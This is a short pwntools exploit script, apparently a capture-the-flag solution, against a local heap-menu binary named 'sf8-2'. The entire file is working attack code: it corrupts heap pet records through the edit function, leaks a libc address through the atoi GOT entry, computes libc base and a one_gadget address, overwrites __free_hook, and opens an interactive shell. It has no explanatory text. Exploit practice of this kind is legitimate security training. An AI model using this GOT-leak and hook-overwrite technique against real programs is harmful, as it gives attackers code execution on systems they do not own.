from pwn import *

p = process("./sf8-2")
e = ELF("./sf8-2")

# context.log_level = 'debug'

def create(name, kind, age):
    p.recvuntil("> ")
    p.sendline("1")
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", age)
    
def edit(index, name, kind, age, y_n):
    p.recvuntil("> ")
    p.sendline("2")
    p.sendafter("> ", str(index))
    p.sendafter("> ", name)
    p.sendafter("> ", kind)
    p.sendafter("> ", str(age))
    p.sendafter("> ", y_n)
    
def print_one(index):
    p.recvuntil(">")
    p.sendline("3")
    p.sendafter("> ", str(index))

def print_all():
    p.recvuntil("> ")
    p.sendline("4")

def delete(index):
    p.recvuntil("> ")
    p.sendline("5")
    p.sendafter("> ", str(index))
    
atoi_got = 0x602068
atoi_plt = 0x400730
bss = 0x6020a0 + 0x200
pet_chunk = 0x00000000006020A0

create("AAAA", "BBBB", "16")
edit(0, "CCCC", "DDDD", "16", "n")
create("EEEE", p64(0x6020B0)+p64(bss), "16")

edit("0", p64(bss), p64(atoi_got), "16", "y")


print_one(2)

p.recvuntil("name: ")
leak = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = leak - 0x36e90
free_hook = libc_base + 0x3c67a8
one_gadget = libc_base + 0xf1247

create("FFFF", "GGGG", "16")

create("HHHH", "IIII", "16") # new chunk -> hook overwite
edit(4, "JJJJ", "KKKK", "16", "n")
create("LLLL", p64(free_hook), "16")
edit(4, p64(one_gadget), "MMMM", "16", "y")

p.interactive()